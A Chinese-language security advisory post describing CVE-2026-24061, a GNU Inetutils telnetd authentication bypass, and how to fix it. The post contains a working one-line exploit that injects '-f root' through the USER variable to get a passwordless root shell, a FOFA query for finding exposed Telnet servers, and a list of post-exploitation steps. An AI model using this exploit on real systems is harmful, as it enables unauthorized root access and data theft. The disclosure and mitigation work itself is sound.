#  【漏洞检测POC】GNU Inetutils Telnetd 远程认证绕过漏洞（CVE-2026-24061）  
原创 金夏
                        金夏  金夏安全   2026-01-22 08:10  
  
免责声明  
  
本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关，本次测试仅供学习使用。如有内容争议或侵权，请及时私信我们！我们会立即删除并致歉。谢谢！  
  
  
**一、漏洞描述**  
  
GNU Inetutils 是 GNU 项目提供的一套经典网络工具集，其中包含  
 telnetd  
 服务，即 Telnet 服务器守护进程。在 **1.9.3 至 2.7**  
 版本中，telnetd  
 服务在用户认证流程中存在致命缺陷。该服务在调用系统登录程序  
 /usr/bin/login  
 时，**未能对客户端传入的 USER 环境变量进行有效过滤和校验**  
。攻击者可通过设置一个特定的 USER  
 变量值，**将 -f 参数直接注入到 login 命令中**  
。login  
 程序的 -f  
 参数用于“跳过二次认证”，这使得攻击者可以**完全绕过所有密码验证环节**  
，直接以 root  
 用户身份建立远程会话，从而获得服务器的最高控制权。该漏洞危害性极高，相当于一个公开的、无需任何凭证的远程root后门。  
  
**二、漏洞检测POC**  
```
USER='-f root' telnet -a <目标IP>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fpGDcfCA2icecXsiacCJunqNmIxiaKqVRNjDY7aRykHpSvIqQjLN6ZcoZL022oe5VQE1BRzxgpSqMHEGT3kbHIubQ/640?wx_fmt=png&from=appmsg "")  
  
**关键利用原理：**  
  
上述命令将环境变量 USER  
 设置为 -f root  
。当存在漏洞的 telnetd  
 服务接收到连接后，会构造并执行类似以下的系统调用：  
```
/usr/bin/login -f root
```  
  
此命令的含义是“以 root 用户身份登录，且跳过密码验证”。因此，攻击者得以直接绕过认证。  
### 三、fofa语法  
```
port="23" && protocol="telnet"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fpGDcfCA2icecXsiacCJunqNmIxiaKqVRNjMibcerN52WyaubRiacCqWxkTjsKJX0lAibxdRjOGpjhSd0Z7q5CwzbIow/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞利用链分析**  
1. **服务发现**  
：攻击者通过扫描互联网或内网，寻找开放 **TCP 23端口**  
 的服务，识别出运行 Telnet 的服务器。  
  
1. **漏洞探测**  
：向目标发送利用命令。由于漏洞利用即探测，一次成功的连接尝试即代表漏洞存在并利用成功。  
  
1. **权限获取**  
：连接建立后，攻击者立即获得一个具有 **root 权限的交互式 shell**  
，无需进行任何登录交互。  
  
1. **后续攻击**  
：获得 root 权限后，攻击者可执行任意命令，包括但不限于：  
  
1. **窃取敏感信息**  
：直接读取 /etc/passwd  
、/etc/shadow  
、应用配置文件、数据库连接字符串等。  
  
1. **植入持久化后门**  
：写入 SSH 授权密钥、安装 rootkit、创建隐藏账户等。  
  
1. **横向移动**  
：利用当前主机作为跳板，攻击内网其他资产。  
  
1. **破坏或勒索**  
：删除数据、加密文件、停止业务服务等。  
  
**漏洞修复建议**  
  
**1. 根本性修复方案**  
- **禁用Telnet，启用SSH**  
：**这是最强烈建议的解决方案**  
。Telnet协议本身以明文传输所有数据（包括利用此漏洞后的所有操作），存在严重的安全缺陷。应立即停止并禁用 telnetd  
 服务，改用基于非对称密钥认证的 SSH 协议进行远程管理。  
```
# 停止服务
sudo systemctl stop telnetd
# 禁用开机自启
sudo systemctl disable telnetd
# 使用防火墙阻止访问（可选但建议）
sudo ufw deny 23/tcp
```  
  
**升级至安全版本**  
：如果业务必须使用 Telnet，请立即将 GNU Inetutils 升级到 **2.8 或更高版本**  
。  
  
-   
-   
-   
-   
-   
-   
**2. 临时缓解措施**  
- **网络层隔离**  
：在防火墙或安全组策略中，将 TCP 23 端口的访问权限**严格限制**  
于必需的管理员IP地址，禁止对公网或非信任网络开放。  
  
- **自定义登录程序（高风险）**  
：技术专家可尝试配置 telnetd  
 调用一个经修改的自定义 login  
 工具，该工具需移除或禁用 -f  
 参数的功能。此操作复杂且可能影响系统稳定性，仅作权宜之计。  
  
写在最后：  
  
CVE-2026-24061 是一个利用极为简单、危害极其严重的认证绕过漏洞。鉴于其POC已公开，所有使用 GNU Inetutils telnetd  
 服务的系统均面临迫在眉睫的攻击风险。强烈建议相关管理员立即遵循上述修复建议，**优先采用“禁用Telnet，启用SSH”的方案**  
，从根本上消除风险。  
  
